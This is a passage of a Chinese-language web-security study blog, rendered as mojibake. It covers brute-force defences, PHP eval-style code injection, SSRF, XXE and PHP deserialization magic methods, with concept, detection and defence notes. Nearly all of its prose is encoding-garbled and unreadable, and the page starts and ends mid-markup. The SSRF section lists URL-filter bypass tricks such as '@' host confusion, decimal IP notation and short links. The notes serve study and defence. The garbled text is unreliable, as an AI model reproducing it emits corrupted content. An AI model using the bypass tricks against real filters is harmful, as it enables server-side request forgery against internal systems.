href="#ä¸‰ã€é˜²å¾¡æ–¹æ³•" class="headerlink" title="ä¸‰ã€é˜²å¾¡æ–¹æ³•"></a>ä¸‰ã€é˜²å¾¡æ–¹æ³•</h3><p>1ã€è®¾ç½®å¤æ‚çš„å¯†ç </p><p>2ã€é‡‡ç”¨éªŒè¯ç æœºåˆ¶ï¼ŒåŒæ—¶å¯é˜²èŒƒCSRFæ”»å‡»</p><p>3ã€ç™»é™†æ—¥å¿—ï¼Œé™åˆ¶ç™»å½•æ¬¡æ•°</p><p>4ã€è°ƒç”¨sleep()å‡½æ•°ï¼Œå½“ç™»å½•å¤±è´¥æ—¶åœæ­¢ä¸€æ®µæ—¶é—´æ‰å…è®¸å†æ¬¡ç™»å½•ï¼Œå¦‚DVWAçš„Highçº§çš„é˜²æš´ç ´æœºåˆ¶</p><h2 id="ä»£ç æ³¨å…¥"><a href="#ä»£ç æ³¨å…¥" class="headerlink" title="ä»£ç æ³¨å…¥"></a>ä»£ç æ³¨å…¥</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-8"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-8" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>ä»£ç æ³¨å…¥ï¼Œä¸å‘½ä»¤æ³¨å…¥ç±»ä¼¼ï¼Œç¨‹åºæœªå¯¹ç”¨æˆ·è¾“å…¥å†…å®¹è¿›è¡Œä¸¥æ ¼æ ¡éªŒä»è€Œå¯¼è‡´æ¶æ„ä»£ç æ³¨å…¥æ‰§è¡Œï¼Œåªä¸è¿‡æ˜¯æ³¨å…¥åˆ°ç‰¹å®šçš„ç¼–ç¨‹è¯­è¨€ä»£ç ä¸­ï¼Œå¦‚PHPçš„evalæ³¨å…¥ã€HTMLé¡µé¢çš„JSæ³¨å…¥ã€OGNLæ³¨å…¥ç­‰ã€‚</p><p>è¿™é‡Œä»¥PHPä¸ºä¸»ï¼ŒJavaä»£ç ä¼šåœ¨Javaåˆ†ç±»ä¸­å•ç‹¬æ€»ç»“ã€‚</p><p><strong>æˆå› </strong></p><p>ç¨‹åºæœªä¸¥æ ¼åŒºåˆ†ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ˜¯æ•°æ®è¿˜æ˜¯ä»£ç ã€‚</p><p><strong>PHPä¸­ä»£ç æ³¨å…¥å‡½æ•°</strong></p><p>eval()ã€assert()ã€preg_replace()ã€str_replace()ã€call_user_func()â€¦ç­‰å‡½æ•°ã€‚</p><p>eval()å‡½æ•°æ³¨å…¥æ”»å‡»ï¼Œå°†å‚æ•°å­—ç¬¦ä¸²ä½œä¸ºPHP ç¨‹åºä»£ç æ¥æ‰§è¡Œï¼Œç”¨æˆ·å¯ä»¥å°† PHP ä»£ç ä¿å­˜æˆå­—ç¬¦ä¸²çš„å½¢å¼ï¼Œç„¶åä¼ é€’ç»™ eval å‡½æ•°æ‰§è¡Œã€‚</p><p>PHPä¸­çš„assert()ã€preg_replace()ã€str_replace()ä»¥åŠcall_user_func()å‡½æ•°åŒæ ·å¯ä»¥å®ç°eval æ³¨å…¥æ”»å‡»çš„æ•ˆæœã€‚preg_replace()å‡½æ•°çš„ä½œç”¨æ˜¯ç”¨æ¥æ‰§è¡Œå¸¸è§„è¡¨è¾¾å¼çš„æŸ¥æ‰¾å’Œæ›¿æ¢çš„ï¼Œå½“æ›¿æ¢å†…å®¹ä¸ºç”¨æˆ·å¯æ§æ•°æ®æ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´å‘½ä»¤æ³¨å…¥æ”»å‡»æ¼æ´çš„å½¢æˆã€‚</p><h3 id="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•-3"><a href="#äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•-3" class="headerlink" title="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•"></a>äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•</h3><p>å’Œå‘½ä»¤æ³¨å…¥ç±»ä¼¼ã€‚</p><h3 id="ä¸‰ã€æ£€æµ‹æ–¹æ³•-5"><a href="#ä¸‰ã€æ£€æµ‹æ–¹æ³•-5" class="headerlink" title="ä¸‰ã€æ£€æµ‹æ–¹æ³•"></a>ä¸‰ã€æ£€æµ‹æ–¹æ³•</h3><p>åŸºäºé»‘ç›’çš„æµ‹è¯•ï¼šç®€å•ç‚¹å°±æ˜¯ç›´æ¥æ‰‹å·¥åœ¨è¾“å…¥å†…å®¹ä¹‹åæ·»åŠ å„ç§åˆ†å·æˆ–å…¶å®ƒå¯ä»¥ç»•è¿‡çš„ç¬¦å·å†æ·»åŠ å‘½ä»¤ï¼Œæœ€åæŸ¥çœ‹è¿”å›ç»“æœåˆ¤æ–­ã€‚</p><p>åŸºäºç™½ç›’çš„æµ‹è¯•ï¼šæŸ¥çœ‹æºä»£ç ï¼Œæœç´¢ä¸æ‰§è¡ŒPHPä»£ç çš„å‡½æ•°å¦‚evalã€assertç­‰ã€‚</p><h3 id="å››ã€é˜²å¾¡æ–¹æ³•-5"><a href="#å››ã€é˜²å¾¡æ–¹æ³•-5" class="headerlink" title="å››ã€é˜²å¾¡æ–¹æ³•"></a>å››ã€é˜²å¾¡æ–¹æ³•</h3><p>1ã€å°½é‡ä¸è¦æ‰§è¡Œå¤–éƒ¨çš„åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ã€‚</p><p>2ã€ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–å‡½æ•°åº“å®ç°å¤–éƒ¨åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤çš„åŠŸèƒ½ã€‚</p><p>3ã€åœ¨æ‰§è¡Œphpä¸­eval()ç­‰ä»£ç æ‰§è¡ŒåŠŸèƒ½çš„å‡½æ•°å‰ï¼Œç¡®å®šå‚æ•°å†…å®¹ã€‚</p><p>4ã€ä½¿ç”¨ escapeshellarg ()å‡½æ•°å’Œescapeshellcmd()å‡½æ•°å¤„ç†ç›¸å…³ç”¨æˆ·è¾“å…¥çš„å†…å®¹ã€‚escapeshellarg() å‡½æ•°ä¼šå°†ä»»ä½•å¼•èµ·å‚æ•°æˆ–å‘½ä»¤ç»“æŸçš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚å•å¼•å·â€œâ€™â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€™â€ï¼ŒåŒå¼•å·â€œâ€â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€â€ï¼Œåˆ†å·â€œ ;â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\;â€ï¼Œè¿™æ · escapeshellarg ä¼šå°†å‚æ•°å†…å®¹é™åˆ¶åœ¨ä¸€å¯¹å•å¼•å·æˆ–åŒå¼•å·é‡Œé¢ï¼Œè½¬ä¹‰å‚æ•°ä¸­æ‰€åŒ…å«çš„å•å¼•å·æˆ–åŒå¼•å·ï¼Œä½¿å…¶æ— æ³•å¯¹å½“å‰æ‰§è¡Œè¿›è¡Œæˆªæ–­ï¼Œå®ç°é˜²èŒƒå‘½ä»¤æ³¨å…¥æ”»å‡»çš„ç›®çš„ã€‚escapeshellcmd()å‡½æ•°ä¼šè½¬ä¹‰å†…å®¹ä¸­çš„æ‰€æœ‰shellå…ƒå­—ç¬¦æ¥è¿›è¡Œé˜²å¾¡ï¼Œè¿™äº›å…ƒå­—ç¬¦åŒ…æ‹¬ï¼š# $ ; , \ â€˜ | ? * ~ &lt; &gt; ^ ( ) [ ] { } </p><p>5ã€ä½¿ç”¨ safe_mode_exec_dir æ‰§è¡Œå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚å°† php.ini æ–‡ä»¶ä¸­çš„ safe_mode è®¾ç½®ä¸º Onï¼Œç„¶åå°†å…è®¸æ‰§è¡Œçš„æ–‡ä»¶æ”¾å…¥ä¸€ä¸ªç›®å½•ä¸­ï¼Œå¹¶ä½¿ç”¨ safe_mode_exec_dir æŒ‡å®šè¿™ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚è¿™æ ·ï¼Œåœ¨éœ€è¦æ‰§è¡Œç›¸åº”çš„å¤–éƒ¨ç¨‹åºæ—¶ï¼Œç¨‹åºå¿…é¡»åœ¨ safe_mode_exec_diræŒ‡å®šçš„ç›®å½•ä¸­æ‰ä¼šå…è®¸æ‰§è¡Œï¼Œå¦åˆ™æ‰§è¡Œå°†å¤±è´¥ã€‚</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-9"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-9" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚</p><p>å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚SSRFæ¼æ´å°±æ˜¯é€šè¿‡ç¯¡æ”¹è·å–èµ„æºçš„è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ï¼Œä½†æ˜¯æœåŠ¡å™¨å¹¶æ²¡æœ‰å‘ç°åœ¨è¿™ä¸ªè¯·æ±‚æ˜¯åˆæ³•çš„ï¼Œç„¶åæœåŠ¡å™¨ä»¥ä»–çš„èº«ä»½æ¥è®¿é—®å…¶ä»–æœåŠ¡å™¨çš„èµ„æºã€‚</p><p><strong>å‡ºç°æ¼æ´çš„å¸¸è§ä½ç½®</strong></p><p>1ï¼‰åˆ†äº«ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹</p><p>2ï¼‰è½¬ç æœåŠ¡</p><p>3ï¼‰åœ¨çº¿ç¿»è¯‘</p><p>4ï¼‰å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p><p>5ï¼‰å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</p><p>6ï¼‰æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–è°ƒç”¨URLçš„åŠŸèƒ½</p><p>7ï¼‰ä»URLå…³é”®å­—ä¸­å¯»æ‰¾</p><h3 id="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•-4"><a href="#äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•-4" class="headerlink" title="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•"></a>äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•</h3><p>ä¸»è¦é’ˆå¯¹URLè¿‡æ»¤çš„ç»•è¿‡ã€‚</p><p>1ã€ ä½¿ç”¨@ç¬¦å·ï¼šæˆ‘ä»¬è¯·æ±‚<a href="http://a.com@b.comä¸è¯·æ±‚http://b.comçš„ç»“æœæ˜¯ä¸€è‡´çš„ï¼›" target="_blank" rel="noopener">http://a.com@b.comä¸è¯·æ±‚http://b.comçš„ç»“æœæ˜¯ä¸€è‡´çš„ï¼›</a></p><p>2ã€ IPåœ°å€è½¬æ¢è¿›åˆ¶è®¿é—®ï¼šå¦‚115.239.210.26 ï¼ 16373751032</p><p>3ã€ æ·»åŠ ç«¯å£å·ï¼š<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>4ã€ ä½¿ç”¨çŸ­é“¾æ¥ï¼š<a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a></p><h3 id="ä¸‰ã€æ£€æµ‹æ–¹æ³•-6"><a href="#ä¸‰ã€æ£€æµ‹æ–¹æ³•-6" class="headerlink" title="ä¸‰ã€æ£€æµ‹æ–¹æ³•"></a>ä¸‰ã€æ£€æµ‹æ–¹æ³•</h3><p>1ã€å› ä¸ºSSRFæ¼æ´æ˜¯æ„é€ æœåŠ¡å™¨å‘é€è¯·æ±‚çš„å®‰å…¨æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯å¦æ˜¯ç”±æœåŠ¡å™¨çš„å‘é€çš„æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFæ¼æ´</p><p>2ã€åœ¨é¡µé¢æºç ä¸­æŸ¥æ‰¾è®¿é—®çš„èµ„æºåœ°å€ ï¼Œå¦‚æœè¯¥èµ„æºåœ°å€ç±»å‹ä¸º <a href="http://www.xxx.com/a.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´</a></p><h3 id="å››ã€é˜²å¾¡æ–¹æ³•-6"><a href="#å››ã€é˜²å¾¡æ–¹æ³•-6" class="headerlink" title="å››ã€é˜²å¾¡æ–¹æ³•"></a>å››ã€é˜²å¾¡æ–¹æ³•</h3><p>1ã€è¿‡æ»¤è¿”å›ä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æœwebåº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚</p><p>2ã€ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚</p><p>3ã€é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ï¼Œ80,443,8080,8090ã€‚</p><p>4ã€é»‘åå•å†…ç½‘ipã€‚é¿å…åº”ç”¨è¢«ç”¨æ¥è·å–è·å–å†…ç½‘æ•°æ®ï¼Œæ”»å‡»å†…ç½‘ã€‚</p><p>5ã€ç¦ç”¨ä¸éœ€è¦çš„åè®®ã€‚ä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äºfile:///,gopher://,ftp:// ç­‰å¼•èµ·çš„é—®é¢˜ã€‚</p><h2 id="XMLæ³¨å…¥"><a href="#XMLæ³¨å…¥" class="headerlink" title="XMLæ³¨å…¥"></a>XMLæ³¨å…¥</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-10"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-10" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>XMLæ˜¯ä¸€ç§å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç†è§£ä¸ºHTMLçš„æ‰©å±•è¯­è¨€ï¼Œä¸€èˆ¬ç”¨äºæ•°æ®å­˜å‚¨ã€æ•°æ®ä¼ è¾“ã€æ•°æ®å…±äº«ï¼Œå…¶ä¸­DTDæ–‡æ¡£æ¥è§£é‡ŠXMLæ–‡æ¡£ã€‚XMLå¿…é¡»åŒ…å«æ ¹å…ƒç´ ï¼Œæ‰€æœ‰çš„æ ‡ç­¾éƒ½è¦é—­åˆï¼Œå¯¹å¤§å°å†™æ•æ„Ÿï¼Œå¹¶ä¸”å±æ€§å€¼éœ€è¦åŠ å¼•å·ã€‚</p><p>XMLæ³¨å…¥å³XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰ï¼Œæ˜¯æŒ‡åˆ©ç”¨å¯æ§çš„å‚æ•°æˆ–å…¥å£æ¥åŠ è½½ä¸å¯æ§çš„å‚æ•°æˆ–ä»£ç ï¼Œé€ æˆä¸å¯æ§çš„è¿è¡Œç»“æœã€‚</p><p>ENTITYå®ä½“ï¼šå¦‚æœåœ¨XMLæ–‡æ¡£ä¸­éœ€è¦é¢‘ç¹ä½¿ç”¨æŸä¸€æ¡æ•°æ®ï¼Œå¯ä»¥é¢„å…ˆç»™è¿™ä¸ªæ•°æ®èµ·ä¸€ä¸ªåˆ«åã€‚å³ä¸€ä¸ªENTITYï¼Œç„¶åå†åœ¨æ–‡æ¡£ä¸­è°ƒç”¨å®ƒã€‚</p><p>XMLå®šä¹‰äº†ä¸¤ç§ç±»å‹çš„ENTITYï¼Œä¸€ç§åœ¨XMLæ–‡æ¡£ä¸­ä½¿ç”¨ï¼Œå¦ä¸€ç§åœ¨ä¸ºå‚æ•°åœ¨DTDæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚</p><p>å®šä¹‰è¯­æ³•ï¼š\&lt;!DOCTYPE  æ–‡ä»¶å [ \&lt;!ENTITY  å®ä½“å â€œå®ä½“å†…å®¹â€&gt; ] &gt;</p><p>å®šä¹‰å¥½çš„ENTITYåœ¨æ–‡æ¡£ä¸­é€šè¿‡â€œ&amp;å®ä½“å;â€æ¥ä½¿ç”¨ã€‚</p><p>æ­£å¸¸æ¥è¯´ï¼ŒDTDåˆ†ä¸ºå†…éƒ¨DTDä¸å¤–éƒ¨DTDï¼Œå†…éƒ¨DTDåŒ…å«åœ¨XMLæ–‡æ¡£ä¸­,å¤–éƒ¨DTDåˆ™é€šè¿‡URLå¼•ç”¨ã€‚ä¸€ä¸ªDTDæ–‡ä»¶æ˜¯ä»¥.dtdç»“å°¾çš„æ–‡æœ¬æ–‡ä»¶ ã€‚å‰é¢è¿˜è¦åŠ ä¸ŠSYSTEMï¼Œä½†æ˜¯å¦‚æœæ­¤å¤„æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å¼•ç”¨ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶çš„ï¼Œå‰ææ˜¯é¡µé¢æœ‰å›æ˜¾ï¼Œå¦åˆ™ä½ åªå¼•ç”¨äº†æ–‡ä»¶ä½†ä¸çŸ¥é“æ–‡ä»¶å†…å®¹ã€‚</p><p><strong>æˆå› ï¼š</strong></p><p>Xfireä½¿ç”¨äº†STAXè§£æXMLå¯¼è‡´XMLå®ä½“æ³¨å…¥å‘ç”Ÿã€‚</p><p>1ã€ç›´æ¥å¼•å…¥XMLå¤–éƒ¨å®ä½“</p><p>2ã€æœªåŠ ä»»ä½•è¿‡æ»¤ç›´æ¥parse</p><p><strong>æ¼æ´å±å®³ï¼š</strong></p><p>1ã€ä»»æ„æ–‡ä»¶è¯»å–ï¼šé€šè¿‡å¤–éƒ¨å®ä½“å¼•ç”¨ï¼Œå¯ä»¥è·å–æ–‡ä»¶å†…å®¹</p><p>2ã€URLè¯·æ±‚ï¼ŒSSRF</p><p>3ã€DoS</p><p>4ã€è¿œç¨‹ä»£ç æ‰§è¡Œï¼šåœ¨PHPå¼€å¯expectæ‰©å±•çš„å‰æä¸‹</p><h3 id="äºŒã€æ£€æµ‹æ–¹æ³•-1"><a href="#äºŒã€æ£€æµ‹æ–¹æ³•-1" class="headerlink" title="äºŒã€æ£€æµ‹æ–¹æ³•"></a>äºŒã€æ£€æµ‹æ–¹æ³•</h3><p>ç›²æµ‹ï¼šåˆ¤æ–­requestçš„XMLè¯·æ±‚æ˜¯å¦è¢«è§£æï¼Œå¯ä»¥æ ¹æ®è¯·æ±‚å¤´ä¸­çš„â€œSOAPâ€å­—æ®µæ¥åˆ¤æ–­ï¼Œä¹Ÿå¯ä»¥æ ¹æ®é”™è¯¯è¿”å›ä¸­æœ‰â€œSAXâ€å­—æ ·ã€‚</p><p>æ¼æ´æŒ–æ˜æ€»ç»“ï¼šä¸€èˆ¬ä¸ºXfireå¼€å‘çš„æˆ–è€…æŸäº›wsdlç»“å°¾çš„æ–‡ä»¶ã€‚</p><p>1ã€Serviceä¸ºXfire</p><p>2ã€æ˜æ˜¾çš„XMLä½œä¸ºå†…å®¹çš„è¾“å…¥ç‚¹</p><p>3ã€æŸäº›ä»¥JSONæ ¼å¼çš„Request</p><h3 id="ä¸‰ã€é˜²å¾¡æ–¹æ³•-1"><a href="#ä¸‰ã€é˜²å¾¡æ–¹æ³•-1" class="headerlink" title="ä¸‰ã€é˜²å¾¡æ–¹æ³•"></a>ä¸‰ã€é˜²å¾¡æ–¹æ³•</h3><p>1ã€ç¦ç”¨å¤–éƒ¨å®ä½“</p><p>2ã€è¿‡æ»¤å’ŒéªŒè¯ç”¨æˆ·æäº¤çš„XMLæ•°æ®</p><p>3ã€ä¸å…è®¸XMLä¸­å«æœ‰ä»»ä½•è‡ªå·±å£°æ˜çš„DTD</p><p>4ã€æœ‰æ•ˆçš„æªæ–½ï¼šé…ç½®XML parseråªèƒ½ä½¿ç”¨é™æ€DTDï¼Œç¦æ­¢å¤–æ¥å¼•å…¥ï¼›å¯¹äºJavaæ¥è¯´ï¼Œç›´æ¥è®¾ç½®ç›¸åº”çš„å±æ€§å€¼ä¸ºfalseå³å¯</p><h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-11"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-11" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>é€šå¸¸æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼Œå…¶ä¸­ä¿å­˜äº†ä¸€äº›å±æ€§å€¼ï¼Œä¸ºäº†æ–¹ä¾¿ä¸‹æ¬¡å¯ä»¥ç»§ç»­ä½¿ç”¨åœ¨è¿™ä¸ªå¯¹è±¡æˆ–è€…åœ¨å…¶ä»–çš„æ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨è¯¥å¯¹è±¡ï¼Œäºæ˜¯å°±å¯ä»¥è°ƒç”¨serialize()å‡½æ•°å°†è¯¥å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²çš„å½¢å¼ï¼Œå°†è¯¥å­—ç¬¦ä¸²ä¿å­˜èµ·æ¥ï¼Œç­‰åˆ°éœ€è¦ä½¿ç”¨è¯¥å¯¹è±¡æ—¶åªéœ€å°†è¯¥å­—ç¬¦ä¸²ä¼ è¿‡å»å¹¶è°ƒç”¨unserialize()å‡½æ•°å¯¹å…¶ååºåˆ—åŒ–å³å¯ã€‚</p><p>è¿™é‡Œä»¥PHPä¸ºä¾‹ï¼ŒJavaçš„ä¼šåœ¨Javaåˆ†ç±»å•ç‹¬æ€»ç»“ã€‚</p><p>PHPåœ¨è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œè‹¥å­˜åœ¨ç›¸åº”çš„é­”æ³•å‡½æ•°ã€unserialize()å‡½æ•°çš„å‚æ•°å¯æ§ä¸”å¯ä»¥ä¼ é€’åˆ°é­”æ³•å‡½æ•°ä¸­æ‰§è¡Œç›¸åº”çš„æ•æ„Ÿæ“ä½œï¼Œåˆ™ä¼šé€ æˆPHPååºåˆ—åŒ–æ¼æ´çš„é£é™©ã€‚</p><p>serialize()ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬æˆå­—ç¬¦ä¸²å½¢å¼ï¼Œæ–¹ä¾¿ä¿å­˜ä»¥ä¾¿äºä¸‹æ¬¡å†æ¬¡ååºåˆ—åŒ–å‡ºè¯¥å¯¹è±¡ç›´æ¥ä½¿ç”¨ã€‚</p><p>unserialize()ï¼šå°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ååºåˆ—åŒ–æˆä¸€ä¸ªå¯¹è±¡ã€‚</p><p><strong>åˆ©ç”¨å‰æ</strong></p><p>unserialize()å‡½æ•°çš„å‚æ•°å¯æ§ï¼›</p><p>ä»£ç ä¸­å­˜åœ¨ä¸€ä¸ªæ„é€ å‡½æ•°ã€ææ„å‡½æ•°ã€__wakeup()å‡½æ•°ä¸­æœ‰å‘phpæ–‡ä»¶ä¸­å†™æ•°æ®çš„æ“ä½œçš„ç±»æˆ–æ‰§è¡ŒPHPä»£ç æˆ–å‘½ä»¤æ‰§è¡Œçš„ç±»ï¼›</p><p>æ‰€å†™çš„å†…å®¹éœ€è¦æœ‰å¯¹è±¡ä¸­çš„æˆå‘˜å˜é‡çš„å€¼ã€‚</p><p><strong>PHPé­”æ³•å‡½æ•°</strong></p><p>ä¸‹é¢åˆ—ä¸‹å¯èƒ½ç»å¸¸ç¢°åˆ°çš„é­”æ³•å‡½æ•°ï¼Œå…¶ä½™çš„æŸ¥æŸ¥èµ„æ–™ä¹ŸçŸ¥é“äº†ã€‚</p><p>__construct()ï¼šæ„é€ å‡½æ•°ï¼Œå½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ã€‚å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚</p><p>__destruct()ï¼šææ„å‡½æ•°ï¼Œå½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ã€‚ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚</p><p>__toString()ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨ã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡E_RECOVERABLE_ERRORçº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p><p>__sleep()ï¼šå¸¸ç”¨äºæäº¤æœªæäº¤çš„æ•°æ®ï¼Œæˆ–ç±»ä¼¼çš„æ¸…ç†æ“ä½œã€‚åŒæ—¶ï¼Œå¦‚æœæœ‰ä¸€äº›å¾ˆå¤§çš„å¯¹è±¡ï¼Œä½†ä¸éœ€è¦å…¨éƒ¨ä¿å­˜ï¼Œè¿™ä¸ªåŠŸèƒ½å°±å¾ˆå¥½ç”¨ã€‚serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL 